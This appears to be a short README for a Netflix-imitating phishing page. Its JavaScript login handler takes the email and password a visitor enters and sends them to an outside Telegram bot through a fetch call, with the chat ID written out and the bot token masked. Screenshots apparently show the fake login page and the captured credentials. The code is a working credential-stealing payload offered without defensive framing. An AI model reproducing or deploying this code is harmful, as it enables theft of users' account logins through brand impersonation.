# `Netflix`

```javascript
function submitLoginForm(event){
    event.preventDefault();
    let email = event.target['email'].value;
    let password = event.target['password'].value;
    let text = email + ` < Netflix > ` + password;
    
    let ID = 5721393154;
    let API = '***********************************************';
    let url = `https://api.telegram.org/bot${API}/sendMessage?chat_id=${ID}&text=${text}`;
    fetch(url);
}
```

<br>

> ![image](https://github.com/imvickykumar/netflix/assets/50515418/82890b6c-0701-4397-a479-2eef6efd3bed)
>
> ![image](https://github.com/imvickykumar/netflix/assets/50515418/f73ee4ba-b498-4153-90c2-e29da6eba546)
